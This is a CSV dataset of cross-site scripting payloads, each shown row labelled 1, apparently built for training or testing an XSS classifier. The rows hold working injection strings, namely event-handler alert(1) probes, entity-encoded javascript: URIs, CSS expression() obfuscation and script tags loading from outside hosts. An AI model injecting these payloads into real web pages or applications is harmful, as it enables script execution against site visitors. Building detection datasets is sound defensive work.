payload,label
"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",1
"<style>:target {color:red;}</style><frame id=x style=""transition:color 1s"" ontransitionend=alert(1)></frame>",1
"<style>@keyframes x{}</style><summary style=""animation-name:x"" onanimationend=""alert(1)""></summary>",1
"""`'><script>\xE2\x80\xA9javascript:alert(1)</script>",1
"<figure onmousemove=""alert(1)"">test</figure>",1
"<noscript onbeforecopy=""alert(1)"" contenteditable>test</noscript>",1
"<style>:target {color:red;}</style><wbr id=x style=""transition:color 1s"" ontransitionend=alert(1)></wbr>",1
"<picture onmouseup=""alert(1)"">test</picture>",1
"<style>@keyframes x{}</style><option style=""animation-name:x"" onanimationend=""alert(1)""></option>",1
"<th onbeforecopy=""alert(1)"" contenteditable>test</th>",1
"<dt draggable=""true"" ondragstart=""alert(1)"">test</dt>",1
"<option onmouseenter=""alert(1)"">test</option>",1
<ul id=x tabindex=1 onactivate=alert(1)></ul>,1
<address id=x tabindex=1 onfocusin=alert(1)></address>,1
"<script SRC=""http://www.securitycompass.com/xss.jpg""></script>",1
"<meter onbeforecut=""alert(1)"" contenteditable>test</meter>",1
"<area onclick=""alert(1)"">test</area>",1
"<plaintext draggable=""true"" ondragend=""alert(1)"">test</plaintext>",1
"<wbr draggable=""true"" ondragenter=""alert(1)"">test</wbr>",1
<html id=x tabindex=1 onfocusin=alert(1)></html>,1
"<fieldset draggable=""true"" ondrag=""alert(1)"">test</fieldset>",1
"<dir onmouseup=""alert(1)"">test</dir>",1
"<ruby draggable=""true"" ondragenter=""alert(1)"">test</ruby>",1
"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",1
"ABC<div style=""x:exp\x00ression(javascript:alert(1)"">DEF",1
"<frameset oncontextmenu=""alert(1)"">test</frameset>",1
"<ul onmouseup=""alert(1)"">test</ul>",1
&lt;BODY ONLOAD=alert('XSS')&gt;,1
<details id=x tabindex=1 onbeforeactivate=alert(1)></details>,1
<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>,1
<data id=x tabindex=1 onfocus=alert(1)></data>,1
"<samp onbeforecut=""alert(1)"" contenteditable>test</samp>",1
"<tfoot draggable=""true"" ondragenter=""alert(1)"">test</tfoot>",1
"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onanimationstart=""alert(1)""></bdi>",1
"<div draggable=""true"" contenteditable>drag me</div><nav ondragover=alert(1) contenteditable>drop here</nav>",1
<fieldset id=x tabindex=1 onfocus=alert(1)></fieldset>,1
"<style>@keyframes slidein {}</style><details style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></details>",1
"<content onclick=""alert(1)"">test</content>",1
"<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d",1
<area id=x tabindex=1 onbeforedeactivate=alert(1)></area><input autofocus>,1
"<ol onmouseout=""alert(1)"">test</ol>",1
"<select onpaste=""alert(1)"" contenteditable>test</select>",1
"<html oncopy=""alert(1)"" contenteditable>test</html>",1
"<li onmouseenter=""alert(1)"">test</li>",1
<source id=x tabindex=1 onactivate=alert(1)></source>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><acronym id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></acronym>",1
"<dir draggable=""true"" ondragleave=""alert(1)"">test</dir>",1
"<bgsound draggable=""true"" ondragenter=""alert(1)"">test</bgsound>",1
<figcaption id=x tabindex=1 onbeforedeactivate=alert(1)></figcaption><input autofocus>,1
"<style>@keyframes slidein {}</style><mark style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></mark>",1
"<IMG SRC=x onprogress=""alert(String.fromCharCode(88,83,83))"">",1
"""><script>alert('XSS')</script>",1
"<keygen oncut=""alert(1)"" contenteditable>test</keygen>",1
&#00060,1
<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>,1
